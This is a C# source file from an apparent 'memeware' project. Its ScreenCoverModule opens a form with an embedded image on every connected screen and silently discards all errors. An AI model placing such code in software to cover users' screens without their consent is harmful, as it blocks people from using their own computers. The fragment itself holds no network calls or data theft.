namespace MysteryExperience
{
    public static class ScreenCoverModule
    {
        public const string CoverImageResourceName = "MysteryMemeware.MysteryAssets.CoverImage.bmp";
        public static void Run()
        {
            try
            {
                System.Reflection.Assembly assembly = typeof(Program).Assembly;
                System.Drawing.Image coverImage = System.Drawing.Image.FromStream(assembly.GetManifestResourceStream(CoverImageResourceName));
                foreach (System.Windows.Forms.Screen screen in System.Windows.Forms.Screen.AllScreens)
                {
                    try
                    {
                        ScreenCoverForm screenCoverForm = new ScreenCoverForm(screen, coverImage);
                        new System.Threading.Thread(() =>
                        {
                            try
                            {
                                screenCoverForm.ShowDialog();
                            }
                            catch
                            {

                            }
                        }).Start();
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }
    }
}